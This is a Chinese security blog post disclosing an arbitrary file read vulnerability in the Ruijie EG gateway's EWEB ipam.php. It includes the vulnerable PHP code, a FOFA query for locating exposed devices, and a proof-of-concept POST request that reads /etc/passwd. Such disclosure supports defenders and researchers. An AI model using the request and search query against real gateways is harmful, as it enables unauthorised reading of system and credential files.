---
title: "锐捷-EWEB ipam.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-ipam-fileread.html
asset_dir: assets/锐捷-eweb-ipam.php-文件读取漏洞
---

# 锐捷-EWEB ipam.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/4 08:20
- 1389浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

Web安全书籍

恶意软件分析工具

数据库

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `ipam.php` 的 `getIpamJsonAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞预警服务

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

直接看 `ddi/server/ipam.php` 中的 `getIpamJsonAction` 方法实现

```
public function getIpamJsonAction() {
        $file = p('path');
        file_put_contents($file, iconv('gbk', 'utf-8', file_get_contents($file)));
        $content = file_get_contents($file); //读取文件中的内容
        echo $content;
    }
```

直接将无任何过滤和校验 post 获取的 `path` 直接带入 `file_get_contents` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /ddi/server/ipam.php?a=getIpamJson HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

path=/etc/passwd
```

成功读取到 `/etc/passwd` 文件内容

[![锐捷-EWEB ipam.php 文件读取漏洞](images/img-001-481954e6c848.webp)](https://image.mrxn.net/dea397a414d64f5b93bfcb0bae3a5da0.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
